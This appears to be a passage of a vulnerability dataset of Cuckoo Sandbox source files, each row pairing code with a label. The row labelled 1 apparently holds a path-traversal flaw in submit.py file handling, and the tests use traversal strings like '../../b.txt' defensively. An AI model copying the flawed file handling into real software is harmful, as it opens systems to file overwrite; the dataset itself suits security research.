        ""oletools==0.42"",
        ""peepdf==0.3.2"",
        ""pefile2==1.2.11"",
        ""pillow==3.2"",
        ""pymisp==2.4.54"",
        ""pymongo==3.0.3"",
        ""python-dateutil==2.4.2"",
        ""python-magic==0.4.12"",
        ""sflock==0.2.5"",
        ""sqlalchemy==1.0.8"",
        ""wakeonlan==0.2.2"",
    ] + install_requires,
    extras_require={
        "":sys_platform == 'win32'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'darwin'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'linux2'"": [
            ""requests[security]==2.7.0"",
            ""scapy==2.3.2"",
        ],
        ""distributed"": [
            ""flask-sqlalchemy==2.1"",
            ""gevent==1.1.1"",
            ""psycopg2==2.6.2"",
        ],
        ""postgresql"": [
            ""psycopg2==2.6.2"",
        ],
    },
    setup_requires=[
        ""pytest-runner"",
    ],
    tests_require=[
        ""coveralls"",
        ""pytest"",
        ""pytest-cov"",
        ""pytest-django"",
        ""pytest-pythonpath"",
        ""flask-sqlalchemy==2.1"",
        ""mock==2.0.0"",
        ""responses==0.5.1"",
    ],
)
/n/n/ntests/test_utils.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import cStringIO
import io
import mock
import os
import pytest
import shutil
import tempfile

import cuckoo

from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage, temppath
from cuckoo.common import utils
from cuckoo.misc import set_cwd

class TestCreateFolders:
    def setup(self):
        self.tmp_dir = tempfile.gettempdir()

    def test_root_folder(self):
        """"""Tests a single folder creation based on the root parameter.""""""
        Folders.create(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_single_folder(self):
        """"""Tests a single folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_multiple_folders(self):
        """"""Tests multiple folders creation.""""""
        Folders.create(self.tmp_dir, [""foo"", ""bar""])
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""bar""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""bar""))

    def test_copy_folder(self):
        """"""Tests recursive folder copy""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.copy(""tests/files/sample_analysis_storage"", dirpath)
        assert os.path.isfile(""%s/reports/report.json"" % dirpath)

    def test_duplicate_folder(self):
        """"""Tests a duplicate folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.create(self.tmp_dir, ""foo"")
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder(self):
        """"""Tests folder deletion #1.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.delete(os.path.join(self.tmp_dir, ""foo""))
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder2(self):
        """"""Tests folder deletion #2.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.delete(self.tmp_dir, ""foo"")
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_create_temp(self):
        """"""Test creation of temporary directory.""""""
        dirpath1 = Folders.create_temp(""/tmp"")
        dirpath2 = Folders.create_temp(""/tmp"")
        assert os.path.exists(dirpath1)
        assert os.path.exists(dirpath2)
        assert dirpath1 != dirpath2

    def test_create_temp_conf(self):
        """"""Test creation of temporary directory with configuration.""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        dirpath2 = Folders.create_temp()
        assert dirpath2.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    @pytest.mark.skipif(""sys.platform != 'linux2'"")
    def test_create_invld_linux(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""/invalid/directory"")

    @pytest.mark.skipif(""sys.platform != 'win32'"")
    def test_create_invld_windows(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""Z:\\invalid\\directory"")

    def test_delete_invld(self):
        """"""Test deletion of a folder we can't access.""""""
        dirpath = tempfile.mkdtemp()

        os.chmod(dirpath, 0)
        with pytest.raises(CuckooOperationalError):
            Folders.delete(dirpath)

        os.chmod(dirpath, 0775)
        Folders.delete(dirpath)

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""a"")
        Folders.create((dirpath, ""a""), ""b"")
        Files.create((dirpath, ""a"", ""b""), ""c.txt"", ""nested"")

        filepath = os.path.join(dirpath, ""a"", ""b"", ""c.txt"")
        assert open(filepath, ""rb"").read() == ""nested""

class TestCreateFile:
    def test_temp_file(self):
        filepath1 = Files.temp_put(""hello"", ""/tmp"")
        filepath2 = Files.temp_put(""hello"", ""/tmp"")
        assert open(filepath1, ""rb"").read() == ""hello""
        assert open(filepath2, ""rb"").read() == ""hello""
        assert filepath1 != filepath2

    def test_create(self):
        dirpath = tempfile.mkdtemp()
        Files.create(dirpath, ""a.txt"", ""foo"")
        assert open(os.path.join(dirpath, ""a.txt""), ""rb"").read() == ""foo""
        shutil.rmtree(dirpath)

    def test_named_temp(self):
        filepath = Files.temp_named_put(""test"", ""hello.txt"", ""/tmp"")
        assert open(filepath, ""rb"").read() == ""test""
        assert os.path.basename(filepath) == ""hello.txt""

    def test_temp_conf(self):
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        filepath = Files.temp_put(""foo"")
        assert filepath.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    def test_stringio(self):
        filepath = Files.temp_put(cStringIO.StringIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_bytesio(self):
        filepath = Files.temp_put(io.BytesIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_create_bytesio(self):
        dirpath = tempfile.mkdtemp()
        filepath = Files.create(dirpath, ""a.txt"", io.BytesIO(""A""*1024*1024))
        assert open(filepath, ""rb"").read() == ""A""*1024*1024

    def test_hash_file(self):
        filepath = Files.temp_put(""hehe"", ""/tmp"")
        assert Files.md5_file(filepath) == ""529ca8050a00180790cf88b63468826a""
        assert Files.sha1_file(filepath) == ""42525bb6d3b0dc06bb78ae548733e8fbb55446b3""
        assert Files.sha256_file(filepath) == ""0ebe2eca800cf7bd9d9d9f9f4aafbc0c77ae155f43bbbeca69cb256a24c7f9bb""

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""foo"")
        Files.create((dirpath, ""foo""), ""a.txt"", ""bar"")

        filepath = os.path.join(dirpath, ""foo"", ""a.txt"")
        assert open(filepath, ""rb"").read() == ""bar""

    def test_fd_exhaustion(self):
        fd, filepath = tempfile.mkstemp()

        for x in xrange(0x100):
            Files.temp_put(""foo"")

        fd2, filepath = tempfile.mkstemp()

        # Let's leave a bit of working space.
        assert fd2 - fd < 64

class TestStorage:
    def test_basename(self):
        assert Storage.get_filename_from_path(""C:\\a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:\\\x00a.txt"") == ""\x00a.txt""
        assert Storage.get_filename_from_path(""/tmp/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""../../b.txt"") == ""b.txt""
        assert Storage.get_filename_from_path(""..\\..\\c.txt"") == ""c.txt""

class TestConvertChar:
    def test_utf(self):
        assert ""\\xe9"", utils.convert_char(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_char(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_char(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_char(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_char("" "")

class TestConvertToPrintable:
    def test_utf(self):
        assert ""\\xe9"" == utils.convert_to_printable(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_to_printable(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_to_printable(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_to_printable(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_to_printable("" "")

    def test_non_printable(self):
        assert r""\x0b"" == utils.convert_to_printable(chr(11))

class TestIsPrintable:
    def test_utf(self):
        assert not utils.is_printable(u""\xe9"")

    def test_digit(self):
        assert utils.is_printable(u""9"")

    def test_literal(self):
        assert utils.is_printable(""e"")

    def test_punctation(self):
        assert utils.is_printable(""."")

    def test_whitespace(self):
        assert utils.is_printable("" "")

    def test_non_printable(self):
        assert not utils.is_printable(chr(11))

def test_version():
    from cuckoo import __version__
    from cuckoo.misc import version
    assert __version__ == version

def test_exception():
    s = utils.exception_message()
    assert ""Cuckoo version: %s"" % cuckoo.__version__ in s
    assert ""alembic:"" in s
    assert ""django-extensions:"" in s
    assert ""peepdf:"" in s
    assert ""sflock:"" in s

def test_guid():
    assert utils.guid_name(""{0002e005-0000-0000-c000-000000000046}"") == ""InprocServer32""
    assert utils.guid_name(""{13709620-c279-11ce-a49e-444553540000}"") == ""Shell""

def test_jsbeautify():
    js = {
        ""if(1){a(1,2,3);}"": ""if (1) {\n    a(1, 2, 3);\n}"",
    }
    for k, v in js.items():
        assert utils.jsbeautify(k) == v

@mock.patch(""cuckoo.common.utils.jsbeautifier"")
def test_jsbeautify_packer(p, capsys):
    def beautify(s):
        print u""error: Unknown p.a.c.k.e.r. encoding.\n"",

    p.beautify.side_effect = beautify
    utils.jsbeautify(""thisisjavascript"")
    out, err = capsys.readouterr()
    assert not out and not err

def test_htmlprettify():
    html = {
        ""<a href=google.com>wow</a>"": '<a href=""google.com"">\n wow\n</a>',
    }
    for k, v in html.items():
        assert utils.htmlprettify(k) == v

def test_temppath():
    dirpath = tempfile.mkdtemp()
    set_cwd(dirpath)
    Folders.create(dirpath, ""conf"")

    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = ""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /tmp""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /custom/directory""
    )
    assert temppath() == ""/custom/directory""

def test_bool():
    assert utils.parse_bool(""true"") is True
    assert utils.parse_bool(""True"") is True
    assert utils.parse_bool(""yes"") is True
    assert utils.parse_bool(""on"") is True
    assert utils.parse_bool(""1"") is True

    assert utils.parse_bool(""false"") is False
    assert utils.parse_bool(""False"") is False
    assert utils.parse_bool(""None"") is False
    assert utils.parse_bool(""no"") is False
    assert utils.parse_bool(""off"") is False
    assert utils.parse_bool(""0"") is False

    assert utils.parse_bool(""2"") is True
    assert utils.parse_bool(""3"") is True

    assert utils.parse_bool(True) is True
    assert utils.parse_bool(1) is True
    assert utils.parse_bool(2) is True
    assert utils.parse_bool(False) is False
    assert utils.parse_bool(0) is False

def test_supported_version():
    assert utils.supported_version(""2.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.0"") is True

    assert utils.supported_version(""2.0.1a1"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.1a1"", ""2.0.1a0"", ""2.0.1b1"") is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1"", None) is False
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", None) is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", ""2.0.1"") is True

def test_validate_url():
    assert utils.validate_url(""http://google.com/"")
    assert utils.validate_url(""google.com"")
    assert utils.validate_url(""google.com/test"")
    assert utils.validate_url(""https://google.com/"")
    assert not utils.validate_url(""ftp://google.com/"")
/n/n/n",0
71,168cabf86730d56b7fa319278bf0f0034052666a,"/cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, data[""data""])
                filedata = open(filepath, ""rb"").read()

                unpacked = sflock.unpack(
                    filepath=filename, contents=filedata,
                    password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree()

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return {
            ""files"": files,
            ""path"": submit.tmp_path,
        }

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""per_file_options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/n/cuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.core.database import Database, TASK_PENDING
from cuckoo.common.mongo import mongo

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")
        data = {}

        task = db.view_task(task_id, details=True)
        if task:
            entry = task.to_dict()
            entry[""guest""] = {}
            if task.guest:
                entry[""guest""] = task.guest.to_dict()

            entry[""errors""] = []
            for error in task.errors:
                entry[""errors""].append(error.message)

            entry[""sample""] = {}
            if task.sample_id:
                sample = db.view_sample(task.sample_id)
                entry[""sample""] = sample.to_dict()

            data[""task""] = entry
        else:
            return Exception(""Task not found"")

        return data

    @staticmethod
    def get_recent(limit=50, offset=0):
        db = Database()
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
/n/n/n/cuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        data = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""data"": data,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/n",1
72,168cabf86730d56b7fa319278bf0f0034052666a,"cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, filename)

                unpacked = sflock.unpack(
